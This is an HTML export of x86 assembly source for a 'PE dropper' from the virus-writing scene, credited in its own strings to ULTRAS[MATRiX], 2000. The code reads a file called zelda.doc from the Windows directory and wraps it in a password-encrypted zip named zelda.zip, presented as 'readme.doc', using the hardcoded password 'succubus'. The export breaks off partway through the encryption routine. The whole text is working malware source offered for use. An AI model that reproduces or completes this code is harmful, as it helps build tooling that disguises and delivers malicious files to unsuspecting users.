<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; PE dropper</span><span class="sc0">
</span><span class="sc1">; tnx T2000</span><span class="sc0">


 </span><span class="sc2">.586p</span><span class="sc0">
 </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
 </span><span class="sc9">.data</span><span class="sc0">


</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">VirtualAlloc</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WaitForSingleObject</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000080h</span><span class="sc0">
</span><span class="sc5">GENERIC_READ</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000003h</span><span class="sc0">
</span><span class="sc5">PAGE_READWRITE</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">MEM_RESERVE</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00002000h</span><span class="sc0">
</span><span class="sc5">MEM_COMMIT</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00001000h</span><span class="sc0">

</span><span class="sc5">zeldadoc</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'\zelda.doc'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szdoc</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">zeldazip</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'\zelda.zip'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szzip</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">local_header</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">04034b50h</span><span class="sc0">       </span><span class="sc1">;local file header signature</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">10</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;version needed to extract</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;general purpose bit flag</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;compression method</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">8c28h</span><span class="sc0">           </span><span class="sc1">;last mod file time</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">28e4h</span><span class="sc0">           </span><span class="sc1">;last mod file date</span><span class="sc0">
</span><span class="sc5">lhcrc32</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;crc-32</span><span class="sc0">
</span><span class="sc5">lhcomsize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;compressed size</span><span class="sc0">
</span><span class="sc5">lhuncomsize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;uncompressed size</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0">              </span><span class="sc1">;filename length</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;extra field length</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'readme.doc'</span><span class="sc0">    </span><span class="sc1">;filename (variable size)</span><span class="sc0">
</span><span class="sc5">e_local_header</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Central_Header</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">02014b50h</span><span class="sc0">       </span><span class="sc1">;central file header signature</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">10</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;version made by</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">10</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;version needed to extract</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;general purpose bit flag</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;compression method</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">8c28h</span><span class="sc0">           </span><span class="sc1">;last mod file time</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">28e4h</span><span class="sc0">           </span><span class="sc1">;last mod file date</span><span class="sc0">
</span><span class="sc5">CH_CRC</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;crc-32</span><span class="sc0">
</span><span class="sc5">CH_Compr_Size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;compressed size</span><span class="sc0">
</span><span class="sc5">CH_Uncompr_Size</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;uncompressed size</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0">              </span><span class="sc1">;filename length</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;extra field length</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;file comment length</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;disk number start</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;internal file attributes</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;external file attributes</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;relative offset of local header</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'readme.doc'</span><span class="sc0">    </span><span class="sc1">;filename (variable size)</span><span class="sc0">
</span><span class="sc5">End_CH</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">End_CH_Dir</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">06054B50h</span><span class="sc0">       </span><span class="sc1">;end of central dir signature</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;number of this disk</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;number of the disk with the</span><span class="sc0">
                                        </span><span class="sc1">;start of the central directory</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;total number of entries in</span><span class="sc0">
                                        </span><span class="sc1">;the central dir on this disk</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;total number of entries in</span><span class="sc0">
                                        </span><span class="sc1">;the central dir</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">End_CH</span><span class="sc4">-</span><span class="sc5">Central_Header</span><span class="sc4">)</span><span class="sc1">;size of the central directory</span><span class="sc0">
</span><span class="sc5">ECD_Central_Dir</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Central_Header</span><span class="sc4">-</span><span class="sc5">local_header</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;offset of start of central</span><span class="sc0">
                                        </span><span class="sc1">;directory with respect to</span><span class="sc0">
                                        </span><span class="sc1">;the starting disk number</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;zipfile comment length</span><span class="sc0">
</span><span class="sc5">End_End_CH_Dir</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Cipher_Key</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'succubus'</span><span class="sc0">      </span><span class="sc1">; The .ZIP password.</span><span class="sc0">
</span><span class="sc5">End_Cipher_Key</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Key0</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">305419896</span><span class="sc0">       </span><span class="sc1">; The encryption keys.</span><span class="sc0">
</span><span class="sc5">Key1</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">591751049</span><span class="sc0">
</span><span class="sc5">Key2</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">878082192</span><span class="sc0">
            
</span><span class="sc5">CRC_Init</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffffffffh</span><span class="sc0">

</span><span class="sc5">filehandle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Archive_Size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Byte_To_CRC</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Temp</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">zelda_drp</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc1">; ebp is always zer0</span><span class="sc0">

 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szdoc</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zeldadoc</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szdoc</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">

 </span><span class="sc1">; Open file to encapsulate in encrypted Zip-archive</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szdoc</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">

 </span><span class="sc1">; save file handle</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc1">; get it's size</span><span class="sc0">
                
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">

 </span><span class="sc1">; fill-in some of Zip-header</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">lhuncomsize</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">CH_Uncompr_Size</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc1">; add size of random encryption header</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">                

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">lhcomsize</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">CH_Compr_Size</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">ECD_Central_Dir</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">Archive_Size</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc1">; allocate memory for input</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">          
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirtualAlloc</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc1">; after the random encryption header</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
             
 </span><span class="sc1">; read-in the file to encode</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">Archive_Size</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc0">

 </span><span class="sc1">; close doc filez</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

 </span><span class="sc1">; get windoze directory</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szzip</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

 </span><span class="sc1">; correct path</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zeldazip</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szzip</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">

 </span><span class="sc1">; create zip file</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szzip</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">

 </span><span class="sc1">; construct the zip-package ( tnx t2000)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Generate_Zip</span><span class="sc0">

 </span><span class="sc1">; write Local File Header</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">e_local_header</span><span class="sc4">-</span><span class="sc5">local_header</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">local_header</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write_File</span><span class="sc0">

 </span><span class="sc1">; write encoded file packet.</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Archive_Size</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write_File</span><span class="sc0">

 </span><span class="sc1">; Write Central File Header + End Of Central Directory.</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">End_End_CH_Dir</span><span class="sc4">-</span><span class="sc5">Central_Header</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Central_Header</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write_File</span><span class="sc0">

 </span><span class="sc1">; close filez</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">          
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">Write_File</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
 </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">vx</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Zelda by ULTRAS[MATRiX] (c) 2000"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Thanx Z0MBiE, T2000"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Greetz: all VX scene"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Generate_Zip</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pushad</span><span class="sc0">
 </span><span class="sc1">; initialize the 3 encryption keys with the password</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">End_Cipher_Key</span><span class="sc4">-</span><span class="sc5">Cipher_Key</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Cipher_Key</span><span class="sc0">
</span><span class="sc5">Init_Keys</span><span class="sc4">:</span><span class="sc0">      
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc1">; update keys with AL.</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Update_Keys</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Init_Keys</span><span class="sc0">

 </span><span class="sc1">; Generate a random 12-byte encryption header.</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">            

 </span><span class="sc1">; This header should be fully random but this </span><span class="sc0">
 </span><span class="sc1">; will do aswell (less code).</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0DEADBEEFh</span><span class="sc0">
 </span><span class="sc6">stosd</span><span class="sc0">

 </span><span class="sc1">; u like it t2000....</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">666</span><span class="sc0">
 </span><span class="sc6">stosd</span><span class="sc0">
 
 </span><span class="sc1">; calculate the CRC of the stored data.</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">lhuncomsize</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC</span><span class="sc0">

 </span><span class="sc1">; save it....</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">lhcrc32</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">            
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">CH_CRC</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
 
 </span><span class="sc1">; the last byte of the random encryption header </span><span class="sc0">
 </span><span class="sc1">; must be the high byte of the CRC.</span><span class="sc0">
